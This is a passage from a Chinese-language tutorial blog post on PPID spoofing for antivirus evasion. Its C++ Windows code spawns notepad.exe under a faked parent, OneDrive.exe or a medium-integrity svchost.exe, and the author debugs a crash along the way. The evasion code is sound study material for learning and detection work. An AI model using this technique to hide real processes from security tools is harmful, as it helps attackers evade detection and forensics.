&amp;attributeSize);</span><br><span class="line">    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)<span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, attributeSize);</span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">    <span class="built_in">UpdateProcThreadAttribute</span>(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="built_in">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    si.StartupInfo.cb = <span class="built_in">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CreateProcessA</span>(<span class="literal">NULL</span>, (LPSTR)<span class="string">&quot;notepad&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si.StartupInfo, &amp;pi);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="0x03-完善代码"><a href="#0x03-完善代码" class="headerlink" title="0x03 完善代码"></a>0x03 完善代码</h2><p>ok，我们已经知道怎么实现<strong>PPID 欺骗</strong>，接下来就是对刚刚对代码进行简单的优化。优化啥呢？想一下，我们每次进行欺骗的时候，都要手动输入目标进程的 pid，这太麻烦了。</p>
<p>于是我们新增一个 <code>ggetPPID</code>函数用于检索我们要欺骗的父进程的PID。比如我们获取<code>OneDrive.exe</code>进程的 PID 。然后代码使用函数<code>CreateProcess</code>生成一个新<code>notepad.exe</code>进程，如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">getPPID</span><span class="params">(LPCWSTR processName)</span> </span>&#123;</span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 process = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    process.dwSize = <span class="built_in">sizeof</span>(process);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;process)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(process.szExeFile, processName))</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(snapshot, &amp;process));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">    <span class="keyword">return</span> process.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    STARTUPINFOEXA si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    SIZE_T attributeSize;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(STARTUPINFOEXA));</span><br><span class="line"></span><br><span class="line">    LPCWSTR parentProcess = <span class="string">L&quot;OneDrive.exe&quot;</span>;</span><br><span class="line">    DWORD parentPID = <span class="built_in">getPPID</span>(parentProcess);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Spoofing %ws (PID: %u) as the parent process.\n&quot;</span>, parentProcess, parentPID);</span><br><span class="line">    HANDLE parentProcessHandle = <span class="built_in">OpenProcess</span>(MAXIMUM_ALLOWED, <span class="literal">false</span>, parentPID);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)<span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, attributeSize);</span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">    <span class="built_in">UpdateProcThreadAttribute</span>(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="built_in">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    si.StartupInfo.cb = <span class="built_in">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line">    LPCWSTR spawnProcess = <span class="string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>;</span><br><span class="line">    <span class="built_in">CreateProcess</span>(spawnProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (STARTUPINFO*)&amp;si, &amp;pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Spawning %ws (PID: %u)\n&quot;</span>, spawnProcess, pi.dwProcessId);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到代码正常运行了。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-cce6c3964482f59c49021012b83ff9b1844181a1.png)</p>
<p>但是，当我把父进程名字改成<code>scvhost.exe</code>的时候，我发现代码没有按预期工作，并没有启动记事本。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-0c4b43569c00e6e88a961104c7f2d73b9e5798c7.png)</p>
<p>于是我打了个断点，发现<code>parentProcessHandle</code>竟然是空的，说明<code>OpenProcess</code>不成功啊。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-e78f0328358b00fe031515fedf1389853dd490e8.png)</p>
<p>于是我怀疑是权限的问题。首先把 <code>integrity level（完整性级别）</code>列显示出来。</p>
<p>Process Explorer 的操作如下：</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-312619406d50041868e33c1ff218d467e9a6bb98.png)</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-48ba41f337406bda7199ef4544a0898d60644ab9.png)</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-0d64903cd7ebb7bc5459151227466403b05da71f.png)</p>
<p>Process Hacker 的操作如下：</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-49bd89bce79f9797a1d36e6647a96f98ef1ad971.png)</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-b17bdae132f86c1258cbef7f158670d6d7a02c77.png)</p>
<p>显示出来之后，我搜了一下<code>836</code>，果然，这个 svchost.exe 的完整性级别是 System，由于我们以标准用户身份运行，具有<strong>MEDIUM</strong>完整性级别，因此我们无权访问以<strong>SYSTEM</strong>完整性级别运行的进程。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-7911e2f56ea144630c3fc25c5558cfbe2da7b105.png)</p>
<p>那么我们如何解决这个问题呢？其实我们往下看，我们可以看到一些<code>svchost.exe</code>完整性级别为<strong>Medium</strong>进程。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-ecdc2a486982c678a11abf4b2ec98be717057936.png)</p>
<p>所以，我们可以添加另一个函数来检查每个进程的完整性级别。用到的函数是<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation">GetTokenInformation</a>，检索与进程关联的访问令牌的信息。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-d1cf8e025b0be72b621aa6b565aad83d9f622ed1.png)</p>
<p>然后与<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/well-known-sids">众所周知的 SID</a> 进行比较，就能确定进程的完整性级别了。然后在代码中加个判断，我们只要完整性级别是 Medium 不就行了吗？直接看代码。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPCWSTR <span class="title">getIntegrityLevel</span><span class="params">(HANDLE hProcess)</span> </span>&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    <span class="built_in">OpenProcessToken</span>(hProcess, TOKEN_QUERY, &amp;hToken);</span><br><span class="line"></span><br><span class="line">    DWORD cbTokenIL = <span class="number">0</span>;</span><br><span class="line">    PTOKEN_MANDATORY_LABEL pTokenIL = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">GetTokenInformation</span>(hToken, TokenIntegrityLevel, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;cbTokenIL);</span><br><span class="line">    pTokenIL = (TOKEN_MANDATORY_LABEL*)<span class="built_in">LocalAlloc</span>(LPTR, cbTokenIL);</span><br><span class="line">    <span class="built_in">GetTokenInformation</span>(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &amp;cbTokenIL);</span><br><span class="line"></span><br><span class="line">    DWORD dwIntegrityLevel = *<span class="built_in">GetSidSubAuthority</span>(pTokenIL-&gt;Label.Sid, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;LOW&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp; dwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;MEDIUM&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;HIGH&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dwIntegrityLevel &gt;= SECURITY_MANDATORY_SYSTEM_RID) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;SYSTEM&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>再修改一下<code>getIntegrityLevel</code>函数在<code>getPPID</code>函数中的调用。让它只会返回具有 Medium 完整性级别的父进程的 PID。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">getPPID</span><span class="params">(LPCWSTR processName)</span> </span>&#123;</span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 process = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    process.dwSize = <span class="built_in">sizeof</span>(process);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;process)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(process.szExeFile, processName)) &#123;</span><br><span class="line">                HANDLE hProcess = <span class="built_in">OpenProcess</span>(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);</span><br><span class="line">                <span class="keyword">if</span> (hProcess) &#123;</span><br><span class="line">                    LPCWSTR integrityLevel = <span class="literal">NULL</span>;</span><br><span class="line">                    integrityLevel = <span class="built_in">getIntegrityLevel</span>(hProcess);</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(integrityLevel, <span class="string">L&quot;MEDIUM&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(snapshot, &amp;process));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">    <span class="keyword">return</span> process.th32ProcessID;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>现在代码如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _CRT_SECURE_NO_WARNINGS</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">LPCWSTR <span class="title">getIntegrityLevel</span><span class="params">(HANDLE hProcess)</span> </span>&#123;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line">    <span class="built_in">OpenProcessToken</span>(hProcess, TOKEN_QUERY, &amp;hToken);</span><br><span class="line"></span><br><span class="line">    DWORD cbTokenIL = <span class="number">0</span>;</span><br><span class="line">    PTOKEN_MANDATORY_LABEL pTokenIL = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">GetTokenInformation</span>(hToken, TokenIntegrityLevel, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;cbTokenIL);</span><br><span class="line">    pTokenIL = (TOKEN_MANDATORY_LABEL*)<span class="built_in">LocalAlloc</span>(LPTR, cbTokenIL);</span><br><span class="line">    <span class="built_in">GetTokenInformation</span>(hToken, TokenIntegrityLevel, pTokenIL, cbTokenIL, &amp;cbTokenIL);</span><br><span class="line"></span><br><span class="line">    DWORD dwIntegrityLevel = *<span class="built_in">GetSidSubAuthority</span>(pTokenIL-&gt;Label.Sid, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;LOW&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dwIntegrityLevel &gt;= SECURITY_MANDATORY_MEDIUM_RID &amp;&amp; dwIntegrityLevel &lt; SECURITY_MANDATORY_HIGH_RID) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;MEDIUM&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dwIntegrityLevel &gt;= SECURITY_MANDATORY_HIGH_RID) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;HIGH&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (dwIntegrityLevel &gt;= SECURITY_MANDATORY_SYSTEM_RID) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">L&quot;SYSTEM&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">getPPID</span><span class="params">(LPCWSTR processName)</span> </span>&#123;</span><br><span class="line">    HANDLE snapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    PROCESSENTRY32 process = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    process.dwSize = <span class="built_in">sizeof</span>(process);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Process32First</span>(snapshot, &amp;process)) &#123;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(process.szExeFile, processName)) &#123;</span><br><span class="line">                HANDLE hProcess = <span class="built_in">OpenProcess</span>(MAXIMUM_ALLOWED, FALSE, process.th32ProcessID);</span><br><span class="line">                <span class="keyword">if</span> (hProcess) &#123;</span><br><span class="line">                    LPCWSTR integrityLevel = <span class="literal">NULL</span>;</span><br><span class="line">                    integrityLevel = <span class="built_in">getIntegrityLevel</span>(hProcess);</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="built_in">wcscmp</span>(integrityLevel, <span class="string">L&quot;MEDIUM&quot;</span>)) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(snapshot, &amp;process));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(snapshot);</span><br><span class="line">    <span class="keyword">return</span> process.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    STARTUPINFOEXA si;</span><br><span class="line">    PROCESS_INFORMATION pi;</span><br><span class="line">    SIZE_T attributeSize;</span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;si, <span class="built_in">sizeof</span>(STARTUPINFOEXA));</span><br><span class="line"></span><br><span class="line">    LPCWSTR parentProcess = <span class="string">L&quot;svchost.exe&quot;</span>;</span><br><span class="line">    DWORD parentPID = <span class="built_in">getPPID</span>(parentProcess);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Spoofing %ws (PID: %u) as the parent process.\n&quot;</span>, parentProcess, parentPID);</span><br><span class="line">    HANDLE parentProcessHandle = <span class="built_in">OpenProcess</span>(MAXIMUM_ALLOWED, <span class="literal">false</span>, parentPID);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(<span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)<span class="built_in">HeapAlloc</span>(<span class="built_in">GetProcessHeap</span>(), <span class="number">0</span>, attributeSize);</span><br><span class="line">    <span class="built_in">InitializeProcThreadAttributeList</span>(si.lpAttributeList, <span class="number">1</span>, <span class="number">0</span>, &amp;attributeSize);</span><br><span class="line">    <span class="built_in">UpdateProcThreadAttribute</span>(si.lpAttributeList, <span class="number">0</span>, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &amp;parentProcessHandle, <span class="built_in">sizeof</span>(HANDLE), <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    si.StartupInfo.cb = <span class="built_in">sizeof</span>(STARTUPINFOEXA);</span><br><span class="line">    LPCWSTR spawnProcess = <span class="string">L&quot;C:\\Windows\\System32\\notepad.exe&quot;</span>;</span><br><span class="line">    <span class="built_in">CreateProcess</span>(spawnProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, TRUE, EXTENDED_STARTUPINFO_PRESENT, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (STARTUPINFO*)&amp;si, &amp;pi);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Spawning %ws (PID: %u)\n&quot;</span>, spawnProcess, pi.dwProcessId);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接运行，发现触发了异常，提示<code>pTokenIL</code>是空指针。好家伙，白嫖的代码，果然不能全信。</p>
<p>![img](picture&#x2F;Parent Process ID (PPID) Spoofing免杀学习&#x2F;attach-c285f7b59c77e76b145517a651f7bc029f189722.png)</p>
<p>为啥是空指针？我也不知道，没办法，为了省事，省略了一堆的异常判断代码，所以导致现在为啥崩溃都不知道。于是乎，很快的，加上异常判断和错误输出。</p>
<p>加入异常判断的<code>getProcessIntegrityLevel</code>函数代码如下：</p>
<blockquote>
<p>代码魔改于 [<a target="_blank" rel="noopener" href="https://github.com/cubika/OneCode/blob/master/Visual%20Studio%202008/CppCreateLowIntegrityProcess/CppCreateLowIntegrityProcess.cpp]">https://github.com/cubika/OneCode/blob/master/Visual%20Studio%202008/CppCreateLowIntegrityProcess/CppCreateLowIntegrityProcess.cpp]</a>(<a target="_blank" rel="noopener" href="https://github.com/cubika/OneCode/blob/master/Visual">https://github.com/cubika/OneCode/blob/master/Visual</a> Studio 2008&#x2F;CppCreateLowIntegrityProcess&#x2F;CppCreateLowIntegrityProcess.cpp)</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">LPCWSTR <span class="title">getProcessIntegrityLevel</span><span class="params">(HANDLE hProcess, PDWORD pdwIntegrityLevel)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DWORD dwError = ERROR_SUCCESS;</span><br><span class="line">    HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">    DWORD cbTokenIL = <span class="number">0</span>;</span><br><span class="line">    PTOKEN_MANDATORY_LABEL pTokenIL = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pdwIntegrityLevel == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        dwError = ERROR_INVALID_PARAMETER;</span><br><span class="line">        <span class="keyword">goto</span> Cleanup;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 以TOKEN_QUERY开启此线程的主访问令牌。</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">OpenProcessToken</span>(hProcess, TOKEN_QUERY, &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] OpenProcessToken error!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        dwError = <span class="built_in">GetLastError</span>();</span><br><span class="line">        <span class="keyword">goto</span> Cleanup;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询令牌完整性级别信息的大小。注意：我们预期得到一个FALSE结果及错误</span></span><br><span class="line">    <span class="comment">// ERROR_INSUFFICIENT_BUFFER， 这是由于我们在GetTokenInformation输入一个</span></span><br><span class="line">    <span class="comment">// 空缓冲。同时，在cbTokenIL中我们会得知完整性级别信息的大小。</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">GetTokenInformation</span>(hToken, TokenIntegrityLevel, <span class="literal">NULL</span>, <span class="number">0</span>, &amp;cbTokenIL))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (ERROR_INSUFFICIENT_BUFFER != <span class="built_in">GetLastError</span>())</span><br><span class="line">        &#123;</span><br><span 